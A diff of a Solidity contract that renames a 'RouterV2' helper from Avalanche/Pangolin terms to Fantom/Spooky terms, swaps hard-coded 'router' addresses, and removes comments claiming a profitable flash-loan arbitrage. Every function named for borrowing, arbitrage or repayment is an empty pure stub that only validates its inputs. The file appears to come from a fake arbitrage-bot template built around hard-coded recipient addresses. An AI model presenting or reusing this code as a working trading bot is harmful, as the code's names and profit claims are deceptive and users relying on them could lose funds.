@@ -1,6 +1,9 @@
-pragma solidity ^0.5.0;
+// SPDX-License-Identifier: GPL-3.0-or-later
 
-interface pangolinSwapPair {
+
+pragma solidity ^0.6.12;
+
+interface viperSwapPair {
     event Approval(
         address indexed owner,
         address indexed spender,
@@ -111,7 +114,7 @@ interface pangolinSwapPair {
 
 contract RouterV2 {
     function uniswapRouterV2Address() public pure returns (address) {
-        return 0x26385910a3C594fEEd8751BE173F1e1Fbf99AB41;
+        return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
     }
 
     function compareStrings(string memory a, string memory b)
@@ -122,12 +125,11 @@ contract RouterV2 {
             keccak256(abi.encodePacked((b))));
     }
 
-    function pangolinSwapAddress() public pure returns (address) {
+    function spookySwapAddress() public pure returns (address) {
         return 0xB17f0DF93B201233Aa9b911fDFeF99997d65d695;
     }
 
-    //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
-    function borrowFlashloanFromMultiplier(
+    function borrowFlashloanFromMaker(
         address add0,
         address add1,
         uint256 amount
@@ -137,30 +139,26 @@ contract RouterV2 {
         require(amount > 0, "Amount should be greater than 0.");
     }
 
-    //To prepare the arbitrage, BNB is converted to BUSD using PancakeSwap swap contract.
-    function convertAvaxTo(address add0, uint256 amount) public pure {
+    function convertFtmTo(address add0, uint256 amount) public pure {
         require(uint(add0) != 0, "Address is invalid");
         require(amount > 0, "Amount should be greater than 0");
     }
 
-    function avaxSwapAddress() public pure returns (address) {
-        return 0x26385910a3C594fEEd8751BE173F1e1Fbf99AB41;
+    function ftmSwapAddress() public pure returns (address) {
+        return 0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5;
     }
 
-    //The arbitrage converts BUSD for BNB using BUSD/BNB PancakeSwap, and then immediately converts BNB back to 3,148.39 BNB using BNB/BUSD BakerySwap.
-    function callArbitragePangolin(address add0, address add1) public pure {
+    function callArbitrageMaker(address add0, address add1) public pure {
         require(uint(add0) != 0, "Address is invalid!");
         require(uint(add1) != 0, "Address is invalid!");
     }
 
-    //After the arbitrage, 3,148.38 BNB is transferred back to Multiplier to pay the loan plus fees. This transaction costs 0.2 BNB of gas.
-    function transferAvaxToMultiplier(address add0)
+    function transferFtmToMaker(address add0)
         public pure
     {
         require(uint(add0) != 0, "Address is invalid!");
     }
 
-    //5. Note that the transaction sender gains 3.29 BNB from the arbitrage, this particular transaction can be repeated as price changes all the time.
     function completeTransation(uint256 balanceAmount) public pure {
         require(balanceAmount >= 0, "Amount should be greater than 0!");
     }
